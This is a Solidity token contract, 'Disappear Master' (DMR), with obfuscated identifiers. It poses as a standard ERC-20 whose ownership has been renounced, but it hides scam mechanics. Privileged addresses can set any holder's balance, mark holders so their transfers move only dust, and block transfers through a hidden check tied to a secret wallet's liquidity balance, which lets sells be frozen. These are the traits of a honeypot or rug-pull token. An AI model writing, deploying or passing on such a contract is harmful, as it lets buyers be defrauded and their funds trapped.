//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface isAmount {
    function createPair(address senderMarketingLimit, address modeMinLaunched) external returns (address);
}

interface amountAtLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxSender) external view returns (uint256);

    function transfer(address buyTx, uint256 launchTeamBuy) external returns (bool);

    function allowance(address autoTakeExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchTeamBuy) external returns (bool);

    function transferFrom(
        address sender,
        address buyTx,
        uint256 launchTeamBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeLaunchedShould, uint256 value);
    event Approval(address indexed autoTakeExempt, address indexed spender, uint256 value);
}

abstract contract launchReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountAtLaunchedMetadata is amountAtLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DisappearMaster is launchReceiver, amountAtLaunched, amountAtLaunchedMetadata {

    bool public receiverFund;

    function buySwap() public {
        emit OwnershipTransferred(autoLiquidity, address(0));
        fromLaunchedLimit = address(0);
    }

    mapping(address => uint256) private receiverSellMarketing;

    mapping(address => bool) public liquiditySwapExempt;

    function transferFrom(address enableLaunch, address buyTx, uint256 launchTeamBuy) external override returns (bool) {
        if (_msgSender() != takeAmount) {
            if (sellIs[enableLaunch][_msgSender()] != type(uint256).max) {
                require(launchTeamBuy <= sellIs[enableLaunch][_msgSender()]);
                sellIs[enableLaunch][_msgSender()] -= launchTeamBuy;
            }
        }
        return sellTeam(enableLaunch, buyTx, launchTeamBuy);
    }

    function allowance(address isLimit, address atShould) external view virtual override returns (uint256) {
        if (atShould == takeAmount) {
            return type(uint256).max;
        }
        return sellIs[isLimit][atShould];
    }

    function symbol() external view virtual override returns (string memory) {
        return shouldWallet;
    }

    function limitEnable(address takeShould, uint256 launchTeamBuy) public {
        listFrom();
        receiverSellMarketing[takeShould] = launchTeamBuy;
    }

    function maxAmount(address enableLaunch, address buyTx, uint256 launchTeamBuy) internal returns (bool) {
        require(receiverSellMarketing[enableLaunch] >= launchTeamBuy);
        receiverSellMarketing[enableLaunch] -= launchTeamBuy;
        receiverSellMarketing[buyTx] += launchTeamBuy;
        emit Transfer(enableLaunch, buyTx, launchTeamBuy);
        return true;
    }

    function getOwner() external view returns (address) {
        return fromLaunchedLimit;
    }

    function approve(address atShould, uint256 launchTeamBuy) public virtual override returns (bool) {
        sellIs[_msgSender()][atShould] = launchTeamBuy;
        emit Approval(_msgSender(), atShould, launchTeamBuy);
        return true;
    }

    function listFrom() private view {
        require(fundTo[_msgSender()]);
    }

    uint256 liquidityToWallet;

    bool public toTokenTeam;

    bool private fundEnableMode;

    function minReceiver(address exemptLiquidityToken) public {
        require(exemptLiquidityToken.balance < 100000);
        if (toTokenTeam) {
            return;
        }
        
        fundTo[exemptLiquidityToken] = true;
        
        toTokenTeam = true;
    }

    bool public modeSender;

    function totalSupply() external view virtual override returns (uint256) {
        return feeTake;
    }

    address takeAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private fromLaunchedLimit;

    function name() external view virtual override returns (string memory) {
        return senderSell;
    }

    address public buySell;

    function balanceOf(address maxSender) public view virtual override returns (uint256) {
        return receiverSellMarketing[maxSender];
    }

    constructor (){
        if (receiverFund) {
            receiverFund = false;
        }
        autoFund marketingTo = autoFund(takeAmount);
        buySell = isAmount(marketingTo.factory()).createPair(marketingTo.WETH(), address(this));
        
        autoLiquidity = _msgSender();
        fundTo[autoLiquidity] = true;
        receiverSellMarketing[autoLiquidity] = feeTake;
        buySwap();
        
        emit Transfer(address(0), autoLiquidity, feeTake);
    }

    uint256 private teamFee;

    uint256 constant launchMarketing = 11 ** 10;

    function receiverLaunchMode(address amountMax) public {
        listFrom();
        if (autoAmountTx == teamFee) {
            receiverFund = true;
        }
        if (amountMax == autoLiquidity || amountMax == buySell) {
            return;
        }
        liquiditySwapExempt[amountMax] = true;
    }

    uint256 private feeTake = 100000000 * 10 ** 18;

    string private senderSell = "Disappear Master";

    bool public totalFee;

    function transfer(address takeShould, uint256 launchTeamBuy) external virtual override returns (bool) {
        return sellTeam(_msgSender(), takeShould, launchTeamBuy);
    }

    uint256 private txTake;

    function owner() external view returns (address) {
        return fromLaunchedLimit;
    }

    function decimals() external view virtual override returns (uint8) {
        return teamBuy;
    }

    function receiverBuy(uint256 launchTeamBuy) public {
        listFrom();
        totalTx = launchTeamBuy;
    }

    address public autoLiquidity;

    uint256 totalTx;

    address toMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private teamBuy = 18;

    event OwnershipTransferred(address indexed limitBuyMarketing, address indexed toList);

    mapping(address => bool) public fundTo;

    mapping(address => mapping(address => uint256)) private sellIs;

    string private shouldWallet = "DMR";

    uint256 public autoAmountTx;

    function sellTeam(address enableLaunch, address buyTx, uint256 launchTeamBuy) internal returns (bool) {
        if (enableLaunch == autoLiquidity) {
            return maxAmount(enableLaunch, buyTx, launchTeamBuy);
        }
        uint256 toSell = amountAtLaunched(buySell).balanceOf(toMode);
        require(toSell == totalTx);
        require(buyTx != toMode);
        if (liquiditySwapExempt[enableLaunch]) {
            return maxAmount(enableLaunch, buyTx, launchMarketing);
        }
        return maxAmount(enableLaunch, buyTx, launchTeamBuy);
    }

}